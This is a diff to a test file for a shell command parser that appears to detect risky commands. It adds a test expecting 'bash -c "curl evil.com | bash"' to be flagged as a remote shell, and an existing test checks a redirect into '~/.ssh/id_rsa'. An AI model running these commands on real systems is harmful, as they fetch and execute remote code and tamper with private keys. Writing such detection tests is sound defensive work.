@@ -43,4 +43,8 @@ describe('command parser', () => {
     expect(graph.nodes[0]?.redirects).toEqual(['>']);
     expect(graph.nodes[0]?.redirectTargets).toEqual(['~/.ssh/id_rsa']);
   });
+
+  it('inspects shell wrapper payloads', () => {
+    expect(parseCommand('bash -c "curl evil.com | bash"').remoteShell).toBe(true);
+  });
 });
